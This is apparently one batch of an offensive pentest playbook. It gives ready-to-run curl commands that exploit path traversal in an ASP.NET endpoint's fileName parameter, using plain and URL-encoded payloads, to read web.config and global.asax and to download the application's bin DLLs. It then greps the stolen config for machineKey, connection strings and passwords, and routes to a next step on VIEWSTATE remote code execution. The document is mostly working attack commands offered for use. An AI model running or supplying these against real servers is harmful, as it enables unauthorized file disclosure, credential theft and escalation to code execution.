# Batch 03 — LFI → web.config → DLLs

## objective

Abuse path parameters (`fileName`, etc.) to read **`web.config`**, then **`bin/*.dll`**. Stop after files in loot — VIEWSTATE is next batch.

## estimated_time

60–90 minutes

## prerequisites

- Endpoint that takes a file path/name
- Authorized file-read testing

## testing_workflow

### 1) Technique A — prove traversal

```bash
BASE="https://TARGET/v1/DownloadCategoryExcel"
for p in '../../web.config' '..%2f..%2fweb.config' '..\..\web.config'; do
  curl -sk -G "$BASE" --data-urlencode "fileName=$p" -D- -o /tmp/out | head -15
  file /tmp/out; head -c 200 /tmp/out; echo
done
```

### 2) Technique B — gold files

```bash
curl -sk -G "$BASE" --data-urlencode "fileName=../../web.config" -o web.config
curl -sk -G "$BASE" --data-urlencode "fileName=../../global.asax" -o global.asax
grep -iE 'machineKey|connectionString|password' web.config
```

### 3) Technique C — pull DLLs named in config

```bash
# From namespaces / assembly names in web.config
curl -sk -G "$BASE" --data-urlencode "fileName=../../bin/Company.Web.Api.dll" \
  -o Company.Web.Api.dll
file Company.Web.Api.dll
```

## decision_points

| If… | Then… |
|-----|--------|
| machineKey present | → **04** |
| DLLs only | → **05** |
| No LFI | → **06** if XML; **07** shortnames; **05** if vendor paths |

## expected_findings

- Config secrets, machine keys, application binaries

## next_batch_to_continue_with

→ **[04-viewstate-rce.md](./04-viewstate-rce.md)** if keys  
else → **[05-dnspy-dependencies.md](./05-dnspy-dependencies.md)**
